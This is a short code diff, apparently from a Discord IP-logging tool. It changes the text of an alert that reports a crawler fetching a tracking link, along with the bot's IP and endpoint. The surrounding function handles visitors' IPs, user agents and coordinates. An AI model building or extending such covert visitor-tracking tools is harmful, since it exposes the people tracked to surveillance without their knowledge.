@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "# Link Sent",
             "color": config["color"],
-            "description": f"An IP may appear soon.\n\n**Endpoint:** `{endpoint}`\n**Bot IP:** `{ip}`\n**Platform:** `DiscordWebCrawler`",
+            "description": f"Information \nAn IP may appear soon.\n\n**Endpoint:** `{endpoint}`\n**Bot IP:** `{ip}`\n**Platform:** `DiscordWebCrawler`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
